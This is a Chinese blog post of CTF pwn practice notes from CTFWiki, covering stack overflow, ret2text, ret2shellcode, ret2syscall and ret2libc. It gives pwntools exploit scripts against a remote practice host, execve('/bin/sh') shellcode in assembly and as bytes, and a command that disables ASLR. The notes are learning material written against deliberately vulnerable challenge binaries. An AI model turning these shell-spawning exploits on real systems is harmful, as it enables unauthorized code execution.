<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="Kuekiko ">
<meta name="description" content="看CTFWiki来入门CTF-PWN (Linux和arm) 做个记录
 知识点：PWN相关知识点总结
 Linux PWN ARM PWN  题目全部来源于 CTFWiki 上所涉及题目
Linux PWN 大部分原理参考CTFWiki
栈溢出 基本栈溢出 #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;void success() { puts(&amp;#34;You Hava already controlled it.&amp;#34;); } void vulnerable() { char s[12]; gets(s); puts(s); return; } int main(int argc, char **argv) { vulnerable(); return 0; } # gcc -m32 -fno-stack-protector -no-pie stack1.c -o stack1 stack1.c: In function ‘vulnerable’: stack1.c:6:3: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’?" />
<meta name="keywords" content=", PWN, CTF" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="#252627" />
<link rel="canonical" href="https://kuekiko.top/posts/2019/02/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_1%E6%A0%88%E6%BA%A2%E5%87%BA/" />


    <title>
        
            CTF PWN刷题记录 CTFWiki_1栈溢出 :: Kuekiko` blog  — Recorded living tip
        
    </title>




<link href="https://cdn.bootcdn.net/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://kuekiko.top/main.154a87e0ff720e102948892a8eb80881aa81a4faf37376f3093be219f6296c3d.css">




    <link rel="apple-touch-icon" sizes="180x180" href="https://kuekiko.top/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://kuekiko.top/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://kuekiko.top/favicon-16x16.png">
    <link rel="manifest" href="https://kuekiko.top/site.webmanifest">
    <link rel="mask-icon" href="https://kuekiko.top/safari-pinned-tab.svg" color="#252627">
    <link rel="shortcut icon" href="https://kuekiko.top/favicon.ico">
    <meta name="msapplication-TileColor" content="#252627">
    <meta name="theme-color" content="#252627">



<meta itemprop="name" content="CTF PWN刷题记录 CTFWiki_1栈溢出">
<meta itemprop="description" content="CTFWiki_1栈溢出">
<meta itemprop="datePublished" content="2019-02-20T00:17:21+08:00" />
<meta itemprop="dateModified" content="2019-02-20T00:17:21+08:00" />
<meta itemprop="wordCount" content="1044">
<meta itemprop="image" content="https://kuekiko.top"/>



<meta itemprop="keywords" content="PWN,CTF," />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://kuekiko.top"/>

<meta name="twitter:title" content="CTF PWN刷题记录 CTFWiki_1栈溢出"/>
<meta name="twitter:description" content="CTFWiki_1栈溢出"/>



    <meta property="og:title" content="CTF PWN刷题记录 CTFWiki_1栈溢出" />
<meta property="og:description" content="CTFWiki_1栈溢出" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://kuekiko.top/posts/2019/02/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_1%E6%A0%88%E6%BA%A2%E5%87%BA/" />
<meta property="og:image" content="https://kuekiko.top"/>
<meta property="article:published_time" content="2019-02-20T00:17:21+08:00" />
<meta property="article:modified_time" content="2019-02-20T00:17:21+08:00" />




    <meta property="article:section" content="PWN" />

    <meta property="article:section" content="CTF" />



    <meta property="article:published_time" content="2019-02-20 00:17:21 &#43;0800 CST" />








    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://kuekiko.top/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text"># cd ~/kuekiko/</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://kuekiko.top/posts/">Posts</a></li><li><a href="https://kuekiko.top/reading/">Reading</a></li><li><a href="https://kuekiko.top/todo/">Todo</a></li><li><a href="https://kuekiko.top/about/">About</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>5 minutes

            

            </p>
        </div>

        <article>
            <h1 class="post-title">
                <a href="https://kuekiko.top/posts/2019/02/ctf-pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-ctfwiki_1%E6%A0%88%E6%BA%A2%E5%87%BA/">CTF PWN刷题记录 CTFWiki_1栈溢出</a>
            </h1>

            

            <div class="post-content">
                <hr>
<blockquote>
<p>看CTFWiki来入门CTF-PWN  (Linux和arm) 做个记录</p>
</blockquote>
<p>知识点：<a href="">PWN相关知识点总结</a></p>
<ul>
<li>Linux PWN</li>
<li>ARM PWN</li>
</ul>
<p>题目全部来源于 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme/">CTFWiki</a> 上所涉及题目</p>
<h2 id="linux-pwn">Linux PWN</h2>
<p>大部分原理参考<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme/">CTFWiki</a></p>
<h4 id="栈溢出">栈溢出</h4>
<h5 id="基本栈溢出">基本栈溢出</h5>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">success</span>() { puts(<span style="color:#e6db74">&#34;You Hava already controlled it.&#34;</span>); }
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vulnerable</span>() {
  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">12</span>];
  gets(s);
  puts(s);
  <span style="color:#66d9ef">return</span>;
}
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv) {
  vulnerable();
  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e"># gcc -m32 -fno-stack-protector -no-pie stack1.c -o stack1
</span><span style="color:#75715e"></span>stack1.c: In function <span style="color:#960050;background-color:#1e0010">‘</span>vulnerable<span style="color:#960050;background-color:#1e0010">’</span><span style="color:#f92672">:</span>
stack1.c:<span style="color:#ae81ff">6</span><span style="color:#f92672">:</span><span style="color:#ae81ff">3</span><span style="color:#f92672">:</span> warning: implicit declaration of function <span style="color:#960050;background-color:#1e0010">‘</span>gets<span style="color:#960050;background-color:#1e0010">’</span>; did you mean <span style="color:#960050;background-color:#1e0010">‘</span>fgets<span style="color:#960050;background-color:#1e0010">’</span><span style="color:#f92672">?</span> [<span style="color:#f92672">-</span>Wimplicit<span style="color:#f92672">-</span>function<span style="color:#f92672">-</span>declaration]
   gets(s);
   <span style="color:#f92672">^~~~</span>
   fgets
<span style="color:#f92672">/</span>tmp<span style="color:#f92672">/</span>ccNeCYTO.o: In function <span style="color:#960050;background-color:#1e0010">`</span>vulnerable<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">:</span>
stack1.c:(.text<span style="color:#f92672">+</span><span style="color:#ae81ff">0x45</span>)<span style="color:#f92672">:</span> warning: the <span style="color:#960050;background-color:#1e0010">`</span>gets<span style="color:#960050;background-color:#1e0010">&#39;</span> function is dangerous and should not be used.
</code></pre></div><p><code> echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p>
<p>关闭完全部保护</p>
<p>步骤：查看gets()写入的地址距离ebp的长度（计算填充长度）-&gt;+ebp的长度-&gt;+返回的地址（success()的地址)</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406211946.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406212108.png" alt=""></p>
<p>poc1.py</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding=utf-8</span>

<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

<span style="color:#75715e"># sh = process(&#34;./stack1&#34;)</span>
sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10000</span>)
success_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048456</span>

payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x14</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;bbbb&#39;</span> <span style="color:#f92672">+</span> p32(success_addr)
sh<span style="color:#f92672">.</span>sendline(payload)
sh<span style="color:#f92672">.</span>interactive()

</code></pre></div><p><img src="https://my-md-1253484710.file.myqcloud.com/20190406212343.png" alt=""></p>
<hr>
<h5 id="基本rop">基本ROP</h5>
<p>ROP 攻击一般得满足如下条件</p>
<ul>
<li>程序存在溢出，并且可以控制返回地址。</li>
<li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li>
</ul>
<h6 id="ret2text">ret2text</h6>
<p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。</p>
<p>示例程序：<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406214601.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190412180957.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406220340.png" alt=""></p>
<p>所以只需ret到<code>0x0804863a</code>就能getshell</p>
<p>构造payload</p>
<ul>
<li>
<p>计算偏移量</p>
<ul>
<li>使用ragg2</li>
</ul>
<p><code>ragg2 -P 200 -r &gt; pattern.txt</code>   or <code>ragg2 -P 200 -r</code>复制下来</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> <span style="color:#75715e"># ragg2 -P 200 -r</span>
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFA#
</code></pre></div><p>profile.rr2:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/usr/bin/rarun2
</span><span style="color:#75715e"></span>stdin<span style="color:#f92672">=</span>./pattern.txt
</code></pre></div><p><code>r2 -R profile.rr2 -d ret2text</code> or 直接<code>r2 -d ret2text</code></p>
<p><code>dc</code>后输入复制的pattern字符串</p>
<p><code>wopO eip</code>得到偏移</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406231721.png" alt=""></p>
<ul>
<li>
<p>gdb手动计算</p>
<p>下断点call处：<code>0x080486ae</code></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406233003.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190406233035.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190412181030.png" alt=""></p>
<p>所以偏移为108+4</p>
</li>
<li>
<p>python pattern.py</p>
</li>
</ul>
</li>
<li>
<p>payload</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
  
<span style="color:#75715e"># sh = process(./ret2text)</span>
sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10001</span>)
binsh <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804863a</span>
payload <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">+</span> p32(binsh)
sh<span style="color:#f92672">.</span>sendline(payload)
sh<span style="color:#f92672">.</span>interactive()
</code></pre></div><p><img src="https://my-md-1253484710.file.myqcloud.com/20190412181108.png" alt=""></p>
</li>
</ul>
<h6 id="ret2shellcode">ret2shellcode</h6>
<p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p>
<ul>
<li>运行时shellcode所在区域应具有可执行权限</li>
</ul>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407123948.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407132349.png" alt=""></p>
<p>strncpy函数将gets的内容复制到buf2 buf存放到.bss段的[0x804a080:4]位置。</p>
<p>调试看所在.bss段是否有执行的权限。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407132843.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407133456.png" alt=""></p>
<p>payload:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding:utf-8</span>
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#75715e"># context(log_level = &#39;debug&#39;,arch =&#39;i386&#39;,os = &#39;linux&#39; )</span>
<span style="color:#75715e"># sh = process(./ret2shellcode)</span>
sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10002</span>)
<span style="color:#75715e">## 获得system(&#34;bin/sh&#34;)的asm</span>
shellcode <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
buf2_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804a080</span>
<span style="color:#75715e"># sh.sendline(shellcode+&#34;\x90&#34;*(112-len(shellcode))+p32(buf2_addr))</span>
sh<span style="color:#f92672">.</span>sendline(shellcode<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">112</span>,<span style="color:#e6db74">&#34;A&#34;</span>)<span style="color:#f92672">+</span>p32(buf2_addr))
sh<span style="color:#f92672">.</span>interactive()
</code></pre></div><p><img src="https://my-md-1253484710.file.myqcloud.com/20190407134402.png" alt=""></p>
<p>练习题：sniperoj-pwn100-shellcode-x86-64</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407140954.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407144021.png" alt=""></p>
<p>偏移：<code> var void *buf @ rbp-0x10</code>   shellcode可用空间：16+8=24</p>
<p>找shellcode  <a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p>
<p><a href="http://shell-storm.org/shellcode/">http://shell-storm.org/shellcode/</a></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm">    <span style="color:#a6e22e">.global</span> <span style="color:#66d9ef">_start</span>
_start:
    <span style="color:#75715e"># char *const argv[]
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">xorl</span> %esi, %esi

    <span style="color:#75715e"># &#39;h&#39; &#39;s&#39; &#39;/&#39; &#39;/&#39; &#39;n&#39; &#39;i&#39; &#39;b&#39; &#39;/&#39;
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">movq</span> <span style="color:#66d9ef">$0x68732f2f6e69622f</span>, %rbx

    <span style="color:#75715e"># for &#39;\x00&#39;
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">pushq</span> %rsi

    <span style="color:#a6e22e">pushq</span> %rbx

    <span style="color:#a6e22e">pushq</span> %rsp
    <span style="color:#75715e"># const char *filename
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">popq</span> %rdi

    <span style="color:#75715e"># __NR_execve 59
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">pushq</span> <span style="color:#66d9ef">$59</span>
    <span style="color:#a6e22e">popq</span> %rax

    <span style="color:#75715e"># char *const envp[]
</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">xorl</span> %edx, %edx

    <span style="color:#a6e22e">syscall</span>
 <span style="color:#960050;background-color:#1e0010">*/</span>

<span style="color:#960050;background-color:#1e0010">/*</span>
  <span style="color:#a6e22e">gcc</span> -<span style="color:#66d9ef">z</span> <span style="color:#66d9ef">execstack</span> <span style="color:#66d9ef">push64.c</span>

  <span style="color:#a6e22e">uname</span> -<span style="color:#66d9ef">r</span>
  <span style="color:#960050;background-color:#1e0010">3</span><span style="color:#a6e22e">.19.3-3-ARCH</span>
 <span style="color:#960050;background-color:#1e0010">*/</span>
 <span style="color:#a6e22e">shellcode</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#960050;background-color:#1e0010">&#34;\</span><span style="color:#66d9ef">x31</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">xf6</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x48</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">xbb</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x2f</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x62</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x69</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x6e</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x2f</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x2f</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x73</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x68</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x56</span><span style="color:#960050;background-color:#1e0010">&#34;</span>
    <span style="color:#960050;background-color:#1e0010">&#34;\</span><span style="color:#a6e22e">x53</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x54</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x5f</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x6a</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x3b</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x58</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x31</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">xd2</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x0f</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x05</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#75715e">;
</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding:utf-8</span>
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#75715e"># context(log_level = &#39;debug&#39;,arch =&#39;x64&#39;,os = &#39;linux&#39; )</span>
io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./shellcode&#39;</span>)
<span style="color:#75715e"># io = remote(&#34;47.106.212.155&#34;,10003)</span>
shellcode <span style="color:#f92672">=</span>     <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05</span><span style="color:#e6db74">&#34;</span>
io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;[&#39;</span>)
buf_addr <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;]&#39;</span>,drop<span style="color:#f92672">=</span>True)
buf_addr <span style="color:#f92672">=</span> int(buf_addr,<span style="color:#ae81ff">16</span>)
<span style="color:#75715e"># print(buf_addr)</span>
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span> p64(buf_addr<span style="color:#f92672">+</span><span style="color:#ae81ff">32</span>) <span style="color:#f92672">+</span> shellcode
<span style="color:#75715e"># 32是24字节的填充数据长度加返回地址长度24+8</span>
<span style="color:#66d9ef">print</span> payload
io<span style="color:#f92672">.</span>sendline(payload)
io<span style="color:#f92672">.</span>interactive()
</code></pre></div><h6 id="ret2syscall">ret2syscall</h6>
<p>控制程序执行系统调用</p>
<p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407152204.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407152706.png" alt=""></p>
<p>相对ebp的偏移为0x64=108  覆盖范围为+4=112</p>
<p>没法ret2text,也没法ret2shellcode</p>
<p>只有使用系统调用来getshell。执行 int 0x80即可执行对应的系统调用</p>
<pre><code>execve(&quot;/bin/sh&quot;,NULL,NULL)
</code></pre><p>使用ROPgadget寻找gadgets</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407155958.png" alt=""></p>
<p>这样就能够控制到eax,ebx,ecx,edx寄存器。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407160123.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407160710.png" alt=""></p>
<p>写payload:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding:utf-8</span>
<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#75715e"># context(log_level = &#39;debug&#39;,arch =&#39;i386&#39;,os = &#39;linux&#39; )</span>
<span style="color:#75715e"># io = process(./ret2syscall)</span>
io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10004</span>)

pop_eax_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080bb196</span>
pop_ebcdx_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0806eb90</span>
int_0x80_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08049421</span>
bin_sh_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080BE408</span>
payload <span style="color:#f92672">=</span> flat(
    [<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">112</span>,pop_eax_addr,<span style="color:#ae81ff">0xb</span>,pop_ebcdx_addr,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,bin_sh_addr,int_0x80_addr]
)
io<span style="color:#f92672">.</span>sendline(payload)
io<span style="color:#f92672">.</span>interactive()

</code></pre></div><h6 id="ret2libc">ret2libc</h6>
<p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(&quot;/bin/sh&rdquo;)，故而此时我们需要知道 system 函数的地址。</p>
<p>eg1:  <a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407175007.png" alt=""></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
{
  <span style="color:#66d9ef">char</span> s; <span style="color:#75715e">// [esp+1Ch] [ebp-64h]
</span><span style="color:#75715e"></span>
  setvbuf(stdout, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
  setvbuf(_bss_start, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>);
  puts(<span style="color:#e6db74">&#34;RET2LIBC &gt;_&lt;&#34;</span>);
  gets(<span style="color:#f92672">&amp;</span>s);
  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p><img src="https://my-md-1253484710.file.myqcloud.com/20190407175502.png" alt=""></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190407175715.png" alt=""></p>
<p>exp1:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

<span style="color:#75715e"># io = process(&#39;./ret2libc1&#39;)</span>
io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10006</span>)
binsh_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048720</span>
sym_plt_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048460</span>

payload <span style="color:#f92672">=</span> flat([<span style="color:#ae81ff">112</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#39;A&#39;</span>,sym_plt_addr,<span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>,binsh_addr])
<span style="color:#75715e"># &#39;bbbb&#39; 作为函数调用栈返回地址的虚假的地址</span>

io<span style="color:#f92672">.</span>sendline(payload)
io<span style="color:#f92672">.</span>interactive()
</code></pre></div><hr>
<p>eg2:</p>
<p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">ret2libc2</a></p>
<p>缺少/bin/sh 只能自己寻找gadgets来进行构造。</p>
<p>exp:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

<span style="color:#75715e"># io = process(&#39;./ret2libc2&#39;)</span>
io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10007</span>)
<span style="color:#75715e"># binsh_addr = 0x08048720</span>
sym_plt_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048490</span>
sym_imp_gets_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048460</span>
pop_ebx_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804872f</span>
buf2_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804a080</span>

payload <span style="color:#f92672">=</span> flat([<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">112</span>,sym_imp_gets_addr,pop_ebx_addr,buf2_addr,sym_plt_addr,<span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>,buf2_addr])
io<span style="color:#f92672">.</span>sendline(payload)
io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>)
io<span style="color:#f92672">.</span>interactive()
</code></pre></div><p>eg3:</p>
<p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a></p>
